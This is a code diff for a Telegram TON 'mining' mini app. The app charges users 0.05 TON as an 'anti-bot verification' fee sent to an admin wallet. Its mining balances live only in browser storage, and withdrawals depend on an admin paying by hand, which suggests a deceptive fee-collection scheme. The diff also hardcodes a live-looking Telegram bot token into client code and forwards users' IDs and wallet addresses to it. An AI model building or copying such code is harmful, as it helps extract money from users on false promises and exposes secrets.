@@ -31,7 +31,7 @@
 
     .lvl-badge { background: #132742; border: 1px solid var(--accent-gold); color: var(--accent-gold); font-size: 11px; font-weight: 800; padding: 4px 10px; border-radius: 20px; cursor: pointer; display: flex; align-items: center; gap: 4px; }
 
-    /* Verification Banner (Tanos US Style) */
+    /* Verify Banner */
     .verify-banner { background: linear-gradient(90deg, #221a08, #131d2e); border: 1px solid var(--accent-gold); border-radius: 16px; padding: 14px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center; }
     .verify-banner.verified { border-color: #2ed573; background: #081d14; }
 
@@ -122,7 +122,7 @@
   <div class="verify-banner" id="verify-box">
     <div>
       <div style="font-size: 13px; font-weight: 700; color: #fff;" id="verify-box-title">🛡️ Verify Account (Anti-Bot)</div>
-      <div style="font-size: 11px; color: var(--text-sub); margin-top: 2px;" id="verify-box-desc">Verify with 0.05 TON to enable withdrawals & activate referral rewards.</div>
+      <div style="font-size: 11px; color: var(--text-sub); margin-top: 2px;" id="verify-box-desc">Verify with 0.05 TON (Includes your unique account memo).</div>
     </div>
     <button class="btn-main btn-gold" id="verify-action-btn" style="width: auto; padding: 8px 14px; font-size: 12px;" onclick="verifyUserWallet()">VERIFY</button>
   </div>
@@ -238,13 +238,12 @@
     </div>
   </div>
 
-  <!-- TAB 4: FRIENDS (STRICT QUALIFIED REFERRALS) -->
+  <!-- TAB 4: FRIENDS (QUALIFIED REFERRALS) -->
   <div id="tab-friends" class="tab-content">
     <div class="card">
       <h3 style="margin-bottom: 6px;">Invite Friends</h3>
       <p style="font-size: 13px; color: var(--text-sub); margin-bottom: 12px;">Earn 5% bonus from verified friends' mining claims!</p>
 
-      <!-- Qualification Notice -->
       <div style="background: #08111e; border: 1px solid var(--accent-gold); border-radius: 12px; padding: 12px; margin-bottom: 14px; font-size: 11px;">
         <b style="color: var(--accent-gold);">⚠️ Anti-Bot Referral Rule:</b><br>
         Your referred friends must <b>Verify Wallet (0.05 TON)</b> AND <b>Hold 100+ IO</b> in their TON wallet to qualify and unlock your 5% claims.
@@ -259,7 +258,6 @@
       <button class="btn-main btn-mining" style="margin-top: 8px;" onclick="copyRefLink()">📋 Copy Link</button>
     </div>
 
-    <!-- Referral List (Empty until verified/holds exist) -->
     <div class="card">
       <div class="card-title">
         <span style="font-weight: 700; color: #fff;">Qualified Referrals (<span id="ref-count">0</span>)</span>
@@ -295,7 +293,7 @@
       </div>
     </div>
 
-    <!-- Active Claim (Only displays if user actually requested) -->
+    <!-- Active Claim (Only displays when submitted) -->
     <div class="card" id="active-claim-card" style="display: none; border-color: var(--accent-gold);">
       <div class="card-title">
         <span style="font-weight: 700; color: #fff;" id="active-claim-id">Active Claim</span>
@@ -315,7 +313,7 @@
           <b style="color: #2ed573;" id="active-claim-net">+0 IO</b>
         </div>
       </div>
-      <div style="font-size: 11px; color: var(--accent-gold);">⏳ Withdrawal request is being processed on-chain.</div>
+      <div style="font-size: 11px; color: var(--accent-gold);">⏳ Withdrawal request is sent to Admin bot for payout.</div>
     </div>
 
     <!-- Withdraw Form -->
@@ -343,7 +341,7 @@
       <button id="submit-withdraw-btn" class="btn-main btn-gold" onclick="submitWithdrawal()">Request Withdrawal</button>
     </div>
 
-    <!-- Clean Withdrawal History (Real Submissions Only) -->
+    <!-- Real Submissions Only History -->
     <div class="card">
       <div class="card-title">
         <span style="font-weight: 700; color: #fff;">Withdrawal History</span>
@@ -393,13 +391,20 @@
   tg.ready();
   tg.expand();
 
+  // Admin Config
+  const ADMIN_BOT_TOKEN = "9126577611:AAEZDAju0zpZNOi6pUkE6m-2BbG3M6PargY";
+  const ADMIN_TELEGRAM_ID = "5330848428"; // သင့် Telegram ID သို့ အကြောင်းကြားစာ တိုက်ရိုက်ရောက်မည်
+  const ADMIN_PAYOUT_WALLET = "UQDUUWNDj91KKR4Ia0eyazhxSVsdREn4AExTiqx2ArFOAdg4"; // သင်ပေးထားသော Verification Wallet
+
   let telegramUserId = "5330848428";
+  let telegramUsername = "User";
   if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
     telegramUserId = tg.initDataUnsafe.user.id;
-    document.getElementById('user-display-name').innerText = '@' + (tg.initDataUnsafe.user.username || tg.initDataUnsafe.user.first_name);
+    telegramUsername = tg.initDataUnsafe.user.username || tg.initDataUnsafe.user.first_name;
+    document.getElementById('user-display-name').innerText = '@' + telegramUsername;
   }
 
-  // 1. 500 Levels System Setup (Speed = 75% of LootVault)
+  // 1. 500 Levels System Setup (75% Speed)
   const LEVEL_TIERS = [
     { lvl: 1, hold: 58, speed: 11.25, boost: 1.0 },
     { lvl: 2, hold: 116, speed: 14.10, boost: 1.3 },
@@ -436,6 +441,7 @@
   let currentSpeed = 11.25;
   let currentBoost = 1.00;
   let currentWalletHold = 0;
+  let userConnectedWallet = "";
 
   function calculateLevelByHold(hold) {
     currentWalletHold = hold;
@@ -485,7 +491,7 @@
     });
   }
 
-  // 2. Anti-Bot 0.05 TON Verification Logic
+  // 2. Anti-Bot 0.05 TON Verification with Comment Memo
   let isUserVerified = localStorage.getItem('io_is_verified') === 'true';
 
   function updateVerifyUI() {
@@ -498,16 +504,29 @@
       box.className = "verify-banner verified";
       title.innerText = "🛡️ Account Verified ✓";
       title.style.color = "#2ed573";
-      desc.innerText = "Anti-bot verification passed. Full withdrawals unlocked.";
+      desc.innerText = "Anti-bot check passed. Full withdrawals unlocked.";
       btn.style.display = "none";
     } else {
       box.className = "verify-banner";
       title.innerText = "🛡️ Verify Account (Anti-Bot)";
-      desc.innerText = "Verify with 0.05 TON to enable withdrawals & activate referral rewards.";
+      desc.innerText = "Verify with 0.05 TON to unlock withdrawals & referrals.";
       btn.style.display = "block";
     }
   }
   updateVerifyUI();
+
+  // Helper function to build TON text comment BOC
+  function buildCommentPayload(commentText) {
+    const bytes = new TextEncoder().encode(commentText);
+    const hex = Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
+    // 00000000 prefix for standard TON text comment
+    const fullHex = "00000000" + hex;
+    const len = fullHex.length / 2;
+    // Simple BOC serialization for single cell standard comment
+    const bocHex = "b5ee9c720101010100" + (len + 2).toString(16).padStart(2, '0') + "0000" + (len).toString(16).padStart(2, '0') + fullHex;
+    const binary = (bocHex.match(/.{1,2}/g) || []).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
+    return btoa(binary);
+  }
 
   async function verifyUserWallet() {
     if (!tonConnectUI.connected) {
@@ -516,13 +535,21 @@
       return;
     }
 
-    const adminWallet = "EQDliaNChKznSyglMpfPGetHAHXbSkoQ2XEjmMifVgTK9HkE";
+    const uniqueComment = `IO verify ${telegramUserId}`;
+    let payloadBase64 = "";
+    try {
+      payloadBase64 = buildCommentPayload(uniqueComment);
+    } catch(err) {
+      payloadBase64 = "";
+    }
+
     const transaction = {
       validUntil: Math.floor(Date.now() / 1000) + 300,
       messages: [
         {
-          address: adminWallet,
-          amount: "50000000" // 0.05 TON in nanoTON
+          address: ADMIN_PAYOUT_WALLET,
+          amount: "50000000", // 0.05 TON
+          payload: payloadBase64
         }
       ]
     };
@@ -532,13 +559,25 @@
       isUserVerified = true;
       localStorage.setItem('io_is_verified', 'true');
       updateVerifyUI();
+
+      // Send Verification Alert to Admin Bot
+      fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: ADMIN_TELEGRAM_ID,
+          text: `🛡️ *NEW USER VERIFIED*\n\n👤 User: @${telegramUsername} (ID: \`${telegramUserId}\`)\n👛 Wallet: \`${userConnectedWallet}\`\n💰 Fee: 0.05 TON\n📝 Memo: \`${uniqueComment}\``,
+          parse_mode: "Markdown"
+        })
+      });
+
       alert("Account Verified Successfully! Anti-bot check completed.");
     } catch (e) {
       alert("Verification cancelled: " + e.message);
     }
   }
 
-  // 3. TON Connect & Wallet Hold Detection
+  // 3. TON Connect & Real Wallet Hold
   const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: 'https://io-mining-app.netlify.app/tonconnect-manifest.json',
     buttonRootId: 'ton-connect-btn'
@@ -546,10 +585,10 @@
 
   tonConnectUI.onStatusChange(async (wallet) => {
     if (wallet) {
-      const addr = wallet.account.address;
-      document.getElementById('wallet-linked-text').innerText = "● Wallet: " + addr.slice(0, 6) + "..." + addr.slice(-4);
+      userConnectedWallet = wallet.account.address;
+      document.getElementById('wallet-linked-text').innerText = "● Wallet: " + userConnectedWallet.slice(0, 6) + "..." + userConnectedWallet.slice(-4);
       try {
-        const res = await fetch(`https://tonapi.io/v2/accounts/${addr}/jettons`);
+        const res = await fetch(`https://tonapi.io/v2/accounts/${userConnectedWallet}/jettons`);
         const data = await res.json();
         const ioJetton = data.balances?.find(b => 
           b.jetton.address.toLowerCase().includes("eqdlianchkzn") || 
@@ -561,6 +600,7 @@
         calculateLevelByHold(0);
       }
     } else {
+      userConnectedWallet = "";
       document.getElementById('wallet-linked-text').innerText = "● Wallet: Not connected";
       calculateLevelByHold(0);
     }
@@ -617,7 +657,7 @@
   calculateLevelByHold(0);
   updateMining();
 
-  // 5. Withdrawal Logic (Clean & Real - Only displays when submitted)
+  // 5. Withdrawal Logic with Instant Telegram Notification
   function setWithdrawVal(val) {
     if (val === 'MAX') {
       const maxPossible = Math.min(100000, totalBalance);
@@ -676,13 +716,13 @@
   }
   renderWithdrawals();
 
-  function submitWithdrawal() {
+  async function submitWithdrawal() {
     if (localStorage.getItem('io_active_claim')) {
       alert("A withdrawal request is already pending. You cannot submit a new one until it is processed.");
       return;
     }
 
-    if (!tonConnectUI.connected) {
+    if (!tonConnectUI.connected || !userConnectedWallet) {
       alert("Please connect your TON wallet first!");
       tonConnectUI.openModal();
       return;
@@ -725,9 +765,30 @@
     history.unshift({ id: claimId, date: "Just now", amount: amount, net: net, status: "Processing" });
     localStorage.setItem('io_withdraw_history', JSON.stringify(history));
 
+    // Admin Telegram သို့ တိုက်ရိုက် စာပို့ခြင်း (Notification Alert)
+    const alertMsg = 
+      `🚨 *NEW WITHDRAWAL REQUEST*\n\n` +
+      `🆔 Claim ID: \`#${claimId}\`\n` +
+      `👤 User: @${telegramUsername} (ID: \`${telegramUserId}\`)\n` +
+      `💰 Amount: *${amount.toLocaleString()} IO*\n` +
+      `📉 Fee (5%): *${fee.toLocaleString()} IO*\n` +
+      `💎 *Payout Net*: *${net.toLocaleString()} IO*\n\n` +
+      `📬 *Payout Address*:\n\`${userConnectedWallet}\`\n\n` +
+      `👉 Copy this address and send *${net.toLocaleString()} IO* from your wallet!`;
+
+    fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: ADMIN_TELEGRAM_ID,
+        text: alertMsg,
+        parse_mode: "Markdown"
+      })
+    });
+
     updateMining();
     renderWithdrawals();
-    alert(`Withdrawal request #${claimId} submitted successfully!`);
+    alert(`Withdrawal request #${claimId} submitted successfully! Admin will process your payout.`);
   }
 
   // 6. STON.fi DEX Rate & Swap
